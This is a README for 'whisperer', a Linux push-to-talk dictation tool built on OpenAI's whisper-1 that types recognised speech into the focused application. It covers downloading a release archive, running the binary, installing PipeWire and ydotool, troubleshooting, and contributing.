# 🎤 whisperer - Dictation Made Simple for Linux

## 🚀 Getting Started

Welcome to whisperer! This application allows you to use push-to-talk dictation on your Linux device. With whisper-1 by OpenAI, you can inject text directly into any focused app, making it easier to capture your thoughts without a keyboard. This guide will help you download and run whisperer successfully.

## 📥 Download the Application

[![Download Whisperer](https://img.shields.io/badge/Download%20Whisperer-v1.0-blue)](https://github.com/NguyenPhamMC/whisperer/releases)

To download the application, visit the [Releases page](https://github.com/NguyenPhamMC/whisperer/releases). You will find the latest version available. 

## 📦 System Requirements

Before you begin, ensure your system meets the following requirements:

- **Operating System:** Linux (Ubuntu, Fedora, Arch, etc.)
- **Hardware:** A microphone for voice input
- **Dependencies:** PipeWire, ydotool

## 🔧 Installation Steps

### 1. Visit the Releases Page

Go to the [whisperer Releases page](https://github.com/NguyenPhamMC/whisperer/releases) to find available versions.

### 2. Download the Latest Version

Choose the latest version from the list. Click on the link to download the `.tar.gz` file.

### 3. Extract the Files

Once downloaded, navigate to your Downloads folder. Right-click on the `.tar.gz` file and choose “Extract Here.” This will create a new folder with the application files.

### 4. Open the Terminal

To run whisperer, you need to open the terminal. You can do this by pressing `Ctrl + Alt + T` on your keyboard.

### 5. Navigate to the Extracted Folder

In the terminal, use the `cd` command to change to the directory where you extracted the files. 

Example command:
```
cd ~/Downloads/whisperer
```

### 6. Run the Application

You can start whisperer by entering the following command in the terminal:
```
./whisperer
```

## 🚀 Using Whisperer

### Push-to-Talk Feature

To use the push-to-talk feature, configure your microphone settings in the application. You can set a hotkey that will activate listening mode when pressed.

### Text Injection

Whisperer will inject recognized text into any app that is currently focused. This includes text editors, browsers, and more. Make sure the app is in focus while you speak.

## ⚙️ Troubleshooting

If you encounter any issues, consider the following steps:

- **Check Microphone Permissions:** Make sure your application has permission to access your microphone. You can check this in your system settings.
- **Audio Levels:** Ensure your microphone volume is set correctly. Test it using a sound application to confirm it’s working.
- **Dependencies Installation:** Make sure you have installed PipeWire and ydotool. You can usually install these using your package manager.

Example command for Ubuntu:
```
sudo apt install pipewire ydotool
```

## 💬 Support

If you need help, feel free to open an issue on the [GitHub Issues page](https://github.com/NguyenPhamMC/whisperer/issues). You can also check out discussions for community support.

## 🔖 Additional Information

whisperer is designed for accessibility and ease of use. It supports a variety of dictation tasks, from writing notes to controlling applications without using a keyboard. 

## 👥 Contributing

We welcome contributions! If you'd like to contribute, please fork the repository and submit a pull request. If you want to suggest a feature or report a bug, do so on the Issues page.

Thank you for choosing whisperer for your dictation needs! For more details, remember to visit the [Releases page](https://github.com/NguyenPhamMC/whisperer/releases) to download the latest version. Enjoy dictating!